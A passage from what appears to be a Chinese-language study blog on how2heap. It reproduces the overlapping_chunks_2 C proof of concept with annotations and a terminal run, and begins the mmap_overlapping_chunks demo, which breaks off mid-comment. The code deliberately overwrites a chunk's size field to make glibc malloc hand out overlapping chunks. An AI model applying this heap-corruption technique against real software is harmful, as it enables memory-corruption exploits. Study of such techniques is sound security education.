class="hljs-number">33334444444444444444444444444444444444444444</span>�<br></code></pre></td></tr></table></figure><h3 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h3><p>扩展已分配的堆块主要考虑到堆块的释放，主要分为向前合并和向后合并。向前合并即是向高地址的chunk合并，主要通过<code>size</code>位来获取；向后合并即是向低地址的chunk合并，主要通过<code>prev_size</code>来获取。当我们能够控制这两个标志，就能控制合并堆块的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> Yet another simple tale of overlapping chunk.</span><br><span class="hljs-comment">扩展未释放的堆块</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This technique is taken from</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>  <br><br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br><br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);<br><br><br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br><br><br>  real_size_p1 = malloc_usable_size(p1);<br><br>  real_size_p2 = malloc_usable_size(p2);<br><br>  real_size_p3 = malloc_usable_size(p3);<br><br>  real_size_p4 = malloc_usable_size(p4);<br><br>  real_size_p5 = malloc_usable_size(p5);<br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1+malloc_usable_size(p1));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p2+malloc_usable_size(p2));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p3+malloc_usable_size(p3));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p4+malloc_usable_size(p4));<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p5+malloc_usable_size(p5));<br><br><br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br><br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br><br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br><br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br><br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); <br><br>  <br><br>  <span class="hljs-built_in">free</span>(p4);<br><br><br><span class="hljs-comment">// 覆盖堆块p2的size位为堆块p2和p3大小的和</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);<br><br><br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE </span><br><br><br><span class="hljs-comment">// 这样释放的时候就会越过堆块p3</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);<br><br>  <span class="hljs-built_in">free</span>(p2);<br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);<br><br><br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br><br>  real_size_p6 = malloc_usable_size(p6);<br><br><br><span class="hljs-comment">// 现在p3和p6产生了堆块重叠</span><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p6+real_size_p6);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) p3+real_size_p3); <br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3); <br><br><br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);<br><br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);  <br><br>  <br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nData inside chunk p3: \n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-type">char</span> *)p3); <br><br><br><br><br><br>&#125;<br><br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./overlapping_chunks_2<br><br>This is a simple chunks overlapping problem<br>This is also referenced as Nonadjacent Free Chunk Consolidation Attack<br><br>Let<span class="hljs-number">&#x27;</span>s start to allocate <span class="hljs-number">5</span> chunks on the heap:<br><br>chunk p1 from <span class="hljs-number">0x956010</span> to <span class="hljs-number">0x9563f8</span><br>chunk p2 from <span class="hljs-number">0x956400</span> to <span class="hljs-number">0x9567e8</span><br>chunk p3 from <span class="hljs-number">0x9567f0</span> to <span class="hljs-number">0x956bd8</span><br>chunk p4 from <span class="hljs-number">0x956be0</span> to <span class="hljs-number">0x956fc8</span><br>chunk p5 from <span class="hljs-number">0x956fd0</span> to <span class="hljs-number">0x9573b8</span><br><br>Let<span class="hljs-number">&#x27;</span>s <span class="hljs-built_in">free</span> the chunk p4.<br>In this <span class="hljs-keyword">case</span> this isn<span class="hljs-number">&#x27;</span>t coealesced with top chunk since we have p5 bordering top chunk after p4<br><br>Let<span class="hljs-number">&#x27;</span>s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2<br>with the size of chunk_p2 + size of chunk_p3<br><br>Now during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span> operation on p2, the allocator is fooled to think that <br>the nextchunk is <span class="hljs-title function_">p4</span> <span class="hljs-params">( since p2 + size_p2 now point to p4 )</span> <br><br>This operation will basically create a big <span class="hljs-built_in">free</span> chunk that wrongly includes p3<br><br>Now let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk<br><br>Our <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> has been satisfied by our crafted big <span class="hljs-built_in">free</span> chunk, now p6 and p3 are overlapping and <br>we can overwrite data in p3 by writing on chunk p6<br><br>chunk p6 from 0x956400 to 0x956bd8<br>chunk p3 from 0x9567f0 to 0x956bd8<br><br>Data inside chunk p3: <br><br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�<br><br>Let&#x27;s write something inside p6<br><br>Data inside chunk p3: <br><br>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�<br></code></pre></td></tr></table></figure><h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Technique should work on all versions of GLibC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">POC written by POC written by Maxwell Dulin (Strikeout) </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A primer on Mmap chunks in GLibC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">==================================</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">In GLibC, there is a point where an allocation is so large that malloc</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decides that we need a seperate section of memory for it, instead </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">of allocating it on the normal heap. This is determined by the mmap_threshold var.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Instead of the normal logic for getting a chunk, the system call *Mmap* is </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">used. This allocates a section of virtual memory and gives it back to the user. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Similarly, the freeing process is going to be different. Instead </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">of a free chunk being given back to a bin or to the rest of the heap,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">another syscall is used: *Munmap*. This takes in a pointer of a previously </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">allocated Mmap chunk and releases it back to the kernel. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Mmap chunks have special bit set on the size metadata: the second bit. If this </span><br><span class="hljs-comment"></span><br><span 